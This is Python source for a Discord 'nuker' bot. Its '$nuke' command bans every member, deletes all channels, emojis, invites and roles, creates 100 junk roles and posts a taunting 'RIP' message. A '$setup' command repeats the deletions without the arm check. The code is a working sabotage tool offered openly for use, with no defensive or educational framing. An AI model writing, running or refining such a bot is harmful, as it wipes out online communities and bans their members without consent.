import discord
import requests
from discord import Webhook, RequestsWebhookAdapter, AsyncWebhookAdapter
from discord.ext import commands
from discord.ext.commands import Bot
import asyncio
import time
from discord_webhook import DiscordWebhook
from threading import Thread
import random
import aiohttp
import random
intents = discord.Intents.default()
intents.members = True
client = commands.Bot(command_prefix='$',intents=intents) #This Is The Prefix, Feel Free To Change It Anytime
client.remove_command("help")
#this does not work
safe = []

        
async def emoji(ctx):
        y = 0
        for Emoji in ctx.guild.emojis:
                try:
                        await Emoji.delete()
                except:
                        None
                y += 1
        print(y,"emojis deleted")

async def invites1(ctx):
        x = 0
        for invite in await ctx.guild.invites():
                try:
                        await invite.delete()
                except:
                        None
                x += 1
        print(x,"invites deleted")

async def roles1(ctx):
        z = 0
        n = 0
        for role in ctx.guild.roles:
                try:
                        #print(role,"deleted")
                        await role.delete()
                        z += 1
                except:
                        #print(role,"could not be deleted")
                        n += 1
        print(z,"roles deleted")
        print(n,"roles could not be deleted")
async def spam_role(ctx):
        for x in range(100):
                await ctx.guild.create_role()
        print("100 new roles created")

async def banner(ctx):
        c = 0
        for user in list(ctx.message.guild.members):
            print(user)
            try:
                name = str(user)
                print(name)
                #await client.ban(user)
                if name not in safe:
                    await ctx.guild.ban(user)
                    c += 1
            except:
                print(e)
                pass
        print(c,"users banned")

async def channels(ctx):
        b = 0
        for channel in list(ctx.message.guild.channels):
            try:
                await channel.delete()
                b += 1
            except:
                pass
        print(b,"users banned")
        guild = ctx.message.guild
        channel = await guild.create_text_channel('RIP')
        await channel.send("if you wanna like, not have this happen to you, get gud")

global armed
armed = False
@client.command(pass_context=True)
async def arm(ctx):
        global armed
        armed = True
        print("armed")
        await ctx.send("armed")
@client.command(pass_context=True)
async def nuke(ctx):
        if armed:
                try:
                        await banner(ctx)
                except:
                        print("no ban")
                try:
                        await channels(ctx)
                except:
                        print("no channel")
                try:
                        await emoji(ctx)
                except:
                        print("no emoji")
                try:
                        await invites1(ctx)
                except:
                        print("no invite")
                try:
                        await roles1(ctx)
                except:
                        print("no role")
                try:
                        await spam_role(ctx)
                except:
                        None
                
                print ("Now that's alot of damage")
        else:
                print("not armed")


@client.command(pass_context=True)
async def setup(ctx):
        await channels(ctx)
        await emoji(ctx)
        await invites1(ctx)
        await roles1(ctx)
        await ctx.send("don't be stupid")

client.run("TOKEN")


